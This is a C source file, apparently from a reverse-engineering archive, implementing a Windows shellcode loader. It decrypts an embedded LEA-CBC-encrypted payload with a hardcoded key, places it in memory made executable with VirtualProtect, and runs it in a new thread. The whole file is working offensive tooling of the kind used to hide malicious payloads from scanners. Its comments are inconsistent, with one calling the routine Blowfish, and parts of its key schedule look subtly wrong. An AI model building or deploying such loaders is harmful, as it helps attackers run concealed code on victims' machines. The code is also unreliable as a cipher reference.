/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory.
    implementing LEA algorithm.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    LEA algorithm
    - permission: VirtualProtect
    - execution:  CreateThread

Reference:
    - https://github.com/ReversingID/Crypto-Reference/blob/master/Codes/Cipher/Block/LEA/code.c

Note:
    - mode: CBC (Cipher Block Chaining)
    - IV is appended into the shellcode
*/

#include <windows.h>
#include <stdint.h>

/* ************************* CONFIGURATION & SEED ************************* */
#define BLOCKSIZE       128
#define BLOCKSIZEB      16
#define KEYSIZE         128
#define KEYSIZEB        16

#ifdef _MSC_VER
    #include <stdlib.h>
    #pragma intrinsic(_lrotr,_lrotl)
    #define rotr(x,n)   _lrotr(x,n)
    #define rotl(x,n)   _lrotl(x,n)
#else 
    #define rotr(x,n)   (((x) >> ((int)(n))) | ((x) << (32 - (int)(n))))
    #define rotl(x,n)   (((x) << ((int)(n))) | ((x) >> (32 - (int)(n))))
#endif

const uint32_t delta[8] = {
    0xc3efe9db, 0x44626b02, 0x79e27c8a, 0x78df30ec,
    0x715ea49e, 0xc785da0a, 0xe04ef22a, 0xe5c40957
};


/* context and configuration */
typedef struct 
{
    uint32_t bits;
    uint32_t rounds;
    uint32_t rkeys[256];
} lea_t;


/* ********************* INTERNAL FUNCTIONS PROTOTYPE ********************* */
void block_decrypt (lea_t * config, uint8_t * val);
void key_setup(lea_t * config, uint8_t * secret, uint32_t bits);


/* *************************** HELPER FUNCTIONS *************************** */
/* XOR 2 data block */
void xor_block(uint8_t * dst, uint8_t * src1, uint8_t * src2)
{
    register uint32_t i = 0;
    for (i = 0; i < BLOCKSIZEB; i++)
        dst[i] = src1[i] ^ src2[i];
}


// Blowfish decryption with CBC
void decrypt(uint8_t * data, uint32_t size, uint8_t * key, uint8_t * iv)
{
    uint32_t    i;
    lea_t       config;
    uint8_t     prev_block[BLOCKSIZEB];
    uint8_t     cipher_block[BLOCKSIZEB];

    // configure key
    key_setup(&config, key, KEYSIZE);

    memcpy(prev_block, iv, BLOCKSIZEB);
    
    for (i = 0; i < size; i += BLOCKSIZEB)
    {
        // copy to temporary block
        memcpy(cipher_block, &data[i], BLOCKSIZEB);

        // decrypt the block
        block_decrypt(&config, &data[i]);

        // XOR the previous ciphertext with current ciphertext block
        xor_block(&data[i], &data[i], prev_block);

        // copy the current ciphertext as previous block
        memcpy(prev_block, cipher_block, BLOCKSIZEB); 
    }
}


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    // IV is embedded within, so we need to mark both payload and IV
    uint8_t     payload []  = { 
        0x31, 0x7d, 0x43, 0xe8, 0x5e, 0xd5, 0xe3, 0x58, 0x25, 0x07, 0x0e, 0x37, 0x86, 0x8c, 0x28, 0xb5,
        0x15, 0xd0, 0x69, 0x9c, 0xea, 0x96, 0x2c, 0x36, 0xba, 0x1a, 0xca, 0x15, 0xc4, 0x01, 0x68, 0x7e,
        0x14, 0xe5, 0x3b, 0xd2, 0x9a, 0xdd, 0x32, 0xda, 0xa3, 0x06, 0xd9, 0x28, 0xf8, 0xcf, 0x4b, 0x77
    };
    uint32_t    payload_len = 32;
    uint8_t*    iv = &payload[payload_len];

    // secret-key
    uint8_t     key[] = 
            { 0x52, 0x45, 0x56, 0x45, 0x52, 0x53, 0x49, 0x4E, 0x47, 0x2E, 0x49, 0x44, 
    /* ASCII:   R     E     V     E     R     S     I     N     G     .     I     D  */
              0x31, 0x33, 0x33, 0x37 };
            /*  1     3     3     7  */

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // decrypt data
    RtlMoveMemory (runtime, payload, payload_len);
    decrypt ((uint8_t*)runtime, payload_len, key, iv);
    	
    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}

void block_decrypt(lea_t * config, uint8_t * val)
{
    // block: 32 * 4 = 128 bit
    uint32_t * rkeys  = config->rkeys;
    uint32_t   rounds = config->rounds;
    uint32_t   current[4], next[4];
    size_t     idx;

    memcpy(current, val, 16);

    for (idx = 0; idx < rounds; idx++)
    {
        next[0] = current[3];
        next[1] = (rotr(current[0], 9) - (next[0] ^ rkeys[((rounds - idx - 1) * 6)    ])) ^ rkeys[((rounds - idx - 1) * 6) + 1];
		next[2] = (rotl(current[1], 5) - (next[1] ^ rkeys[((rounds - idx - 1) * 6) + 2])) ^ rkeys[((rounds - idx - 1) * 6) + 3];
		next[3] = (rotl(current[2], 3) - (next[2] ^ rkeys[((rounds - idx - 1) * 6) + 4])) ^ rkeys[((rounds - idx - 1) * 6) + 5];

        memcpy(current, next, 16);
    }

    memcpy(val, current, 16);
}

void 
key_setup(lea_t * config, uint8_t * secret, uint32_t bits)
{
    uint32_t   T[8];
    size_t     idx;

    config->bits = bits;
    memcpy(T, secret, config->bits / 8);
    memset(config->rkeys, 0, sizeof(config->rkeys));

    // generate round keys
    if (config->bits == 128)
    {
        config->rounds = 24;
        for (idx = 0; idx < config->rounds; idx++)
        {
            T[0] = rotl(T[0] + rotl(idx    , delta[idx % 4]),  1);
            T[1] = rotl(T[1] + rotl(idx + 1, delta[idx % 4]),  3);
            T[2] = rotl(T[2] + rotl(idx + 2, delta[idx % 4]),  6);
            T[3] = rotl(T[3] + rotl(idx + 3, delta[idx % 4]), 11);

            config->rkeys[idx * 6    ] = T[0];
            config->rkeys[idx * 6 + 1] = T[1];
            config->rkeys[idx * 6 + 2] = T[2];
            config->rkeys[idx * 6 + 3] = T[1];
            config->rkeys[idx * 6 + 4] = T[3];
            config->rkeys[idx * 6 + 5] = T[1];
        }
    }
    else if (config->bits == 192)
    {
        config->rounds = 28;
        for (idx = 0; idx < config->rounds; idx ++)
        {
            T[0] = rotl(T[0] + rotl(idx    , delta[idx % 6]),  1);
            T[1] = rotl(T[1] + rotl(idx + 1, delta[idx % 6]),  3);
            T[2] = rotl(T[2] + rotl(idx + 2, delta[idx % 6]),  6);
            T[3] = rotl(T[3] + rotl(idx + 3, delta[idx % 6]), 11);
            T[4] = rotl(T[4] + rotl(idx + 4, delta[idx % 6]), 13);
            T[5] = rotl(T[5] + rotl(idx + 5, delta[idx % 6]), 17);
            
            config->rkeys[idx * 6    ] = T[0];
            config->rkeys[idx * 6 + 1] = T[1];
            config->rkeys[idx * 6 + 2] = T[2];
            config->rkeys[idx * 6 + 3] = T[3];
            config->rkeys[idx * 6 + 4] = T[4];
            config->rkeys[idx * 6 + 5] = T[5];
        
        }
    }
    else if (config->bits == 256)
    {
        config->rounds = 32;
        for (idx = 0; idx < config->rounds; idx++)
        {
            T[(6 * idx    ) % 8] =rotl(T[(6 * idx    ) % 8] + rotl(idx    , delta[idx % 8]),  1);
            T[(6 * idx + 1) % 8] =rotl(T[(6 * idx + 1) % 8] + rotl(idx + 1, delta[idx % 8]),  3);
            T[(6 * idx + 2) % 8] =rotl(T[(6 * idx + 2) % 8] + rotl(idx + 2, delta[idx % 8]),  6);
            T[(6 * idx + 3) % 8] =rotl(T[(6 * idx + 3) % 8] + rotl(idx + 3, delta[idx % 8]), 11);
            T[(6 * idx + 4) % 8] =rotl(T[(6 * idx + 4) % 8] + rotl(idx + 4, delta[idx % 8]), 13);
            T[(6 * idx + 5) % 8] =rotl(T[(6 * idx + 5) % 8] + rotl(idx + 5, delta[idx % 8]), 17);
            
            config->rkeys[idx * 6    ] = T[(idx * 6    ) % 8];
            config->rkeys[idx * 6 + 1] = T[(idx * 6 + 1) % 8];
            config->rkeys[idx * 6 + 2] = T[(idx * 6 + 2) % 8];
            config->rkeys[idx * 6 + 3] = T[(idx * 6 + 3) % 8];
            config->rkeys[idx * 6 + 4] = T[(idx * 6 + 4) % 8];
            config->rkeys[idx * 6 + 5] = T[(idx * 6 + 5) % 8];
        }
    }
}